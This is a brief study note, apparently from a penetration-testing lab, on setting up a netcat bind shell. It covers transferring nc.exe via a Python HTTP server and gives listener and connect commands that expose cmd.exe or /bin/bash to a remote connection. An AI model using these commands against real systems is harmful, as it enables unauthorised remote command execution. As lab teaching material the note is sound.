#### Bind shell
- A bind shell is a type of remote shell where the attacker connects directly to a listener on the target system,consequently allowing for execution of commands on the target system
- A Netcat listener can be setup to execute a specific executable like cmd.exe or /bin/bash when a client connects to the listener.

#### Lab
Transfering nc.exe file from attaker(kali) to windows(victim)
- python -m SimpleHTTPServer 80 [start a server in kali ]
- Browse the kali Ip(attacker_ip) in victim browser.
- Download the file
  
##### When attacker machine is kali:
- nc.exe -nvlp 1234 -e cmd.exe [ run this command in windows victim machine,-e cmd.exe file is executed when it will connected ]
- Back into attacker machine
- nc -nv victim_ip 1234 [this will give cmd shell  ]
##### When attacke machine is windows
- nc -nvlp 1234 -c /bin/bash [run this in kali victim machine ]
- nc.exe -nv victim_ip 1234 [this will give us bash shell ]

####Note 
- nc.exe file is found /usr/share/windows-resources/binaries this directories
